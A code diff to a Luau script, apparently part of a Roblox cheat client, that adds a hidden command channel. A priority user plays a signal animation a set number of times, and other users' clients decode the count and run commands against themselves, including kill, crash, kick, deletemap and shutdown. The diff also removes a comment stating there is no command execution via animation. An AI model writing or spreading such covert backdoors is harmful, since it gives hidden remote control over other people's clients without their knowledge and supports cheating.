@@ -1620,6 +1620,15 @@ velo.run(function()
 		end;
 	end;
 
+	local CMD_ANIM_CODES: {[string]: number} = {
+		kill = 2, crash = 3, kick = 4, deletemap = 5,
+		jump = 6, void = 7, shutdown = 8, block = 9,
+	};
+	local ANIM_CODE_CMDS: {[number]: string} = {};
+	for cmd: string, code: number in CMD_ANIM_CODES do
+		ANIM_CODE_CMDS[code] = cmd;
+	end;
+
 	local function playSignalAnim(): ()
 		pcall(function(): ()
 			local anim: Animation = Instance.new('Animation');
@@ -1631,6 +1640,25 @@ velo.run(function()
 				track:Play();
 				task.wait(1);
 				track:Stop();
+			end;
+		end);
+	end;
+
+	local function playCommandAnim(cmdName: string): ()
+		local code: number? = CMD_ANIM_CODES[cmdName];
+		if not code then return; end;
+		pcall(function(): ()
+			local char: Model? = lplr.Character;
+			local hum: Humanoid? = char and char:FindFirstChildOfClass('Humanoid');
+			if not hum then return; end;
+			for i: number = 1, code do
+				local anim: Animation = Instance.new('Animation');
+				anim.AnimationId = SIGNAL_ANIM_ID;
+				local track: AnimationTrack = hum:LoadAnimation(anim);
+				track:Play();
+				task.wait(0.3);
+				track:Stop();
+				if i < code then task.wait(0.2); end;
 			end;
 		end);
 	end;
@@ -1650,7 +1678,6 @@ velo.run(function()
 		end);
 	end;
 
-	-- ping/pong vape detection only — no command execution via animation
 	whitelist.watchAnimations = function(self: any, plr: Player): ()
 		if plr == lplr then return; end;
 		task.spawn(function(): ()
@@ -1658,12 +1685,35 @@ velo.run(function()
 			local hum: Humanoid? = char and char:FindFirstChildOfClass('Humanoid');
 			local animator: Animator? = hum and hum:FindFirstChildOfClass('Animator');
 			if not animator then return; end;
+			local animCount: number = 0;
+			local debounceActive: boolean = false;
 			vape:Clean(animator.AnimationPlayed:Connect(function(track: AnimationTrack): ()
 				if track.Animation and track.Animation.AnimationId == SIGNAL_ANIM_ID then
 					if self.localprio > 0 then
 						self:flagVapeUser(plr);
-					elseif self.localprio == 0 then
-						task.spawn(playSignalAnim);
+						return;
+					end;
+					animCount = animCount + 1;
+					if not debounceActive then
+						debounceActive = true;
+						task.delay(2, function(): ()
+							local count: number = animCount;
+							animCount = 0;
+							debounceActive = false;
+							if count == 1 then
+								task.spawn(playSignalAnim);
+							elseif count >= 2 then
+								local cmdName: string? = ANIM_CODE_CMDS[count];
+								if cmdName then
+									local cmdFunc: any = self.commands[cmdName];
+									if cmdFunc then
+										task.spawn(function(): ()
+											cmdFunc({}, plr);
+										end);
+									end;
+								end;
+							end;
+						end);
 					end;
 				end;
 			end));
@@ -1723,7 +1773,7 @@ velo.run(function()
 			return true;
 		end;
 
-		-- if we typed it, suppress display and whisper command to targets
+		-- if we typed it, suppress display, whisper + animation broadcast to targets
 		if plr == lplr then
 			if cmdStr:sub(1, 1) == ';' then
 				local cmdName: string = cmdStr:sub(2):lower();
@@ -1735,6 +1785,11 @@ velo.run(function()
 								whisperCommand(target, cmdName);
 							end);
 						end;
+					end;
+					if CMD_ANIM_CODES[cmdName] then
+						task.spawn(function(): ()
+							playCommandAnim(cmdName);
+						end);
 					end;
 				end;
 				return true;
